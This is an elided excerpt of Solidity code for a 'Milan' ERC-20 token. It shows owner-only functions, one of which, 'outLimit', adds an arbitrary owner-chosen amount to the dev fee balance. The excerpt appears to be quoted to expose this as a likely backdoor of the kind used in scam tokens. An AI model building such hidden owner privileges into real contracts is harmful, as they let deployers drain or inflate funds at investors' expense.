...
contract Milan is Context, IERC20, Ownable{
    ...
    string private _name = "Milan";
    string private _symbol = "MILAN";
    ...
    function withdrawtoken(bool _enabled) external onlyOwner{
    ...
    function outLimit(uint256 rDev) external onlyOwner {       
        if(_isExcluded[address(this)])
        {
            totalFees.dev +=rDev;
        }        
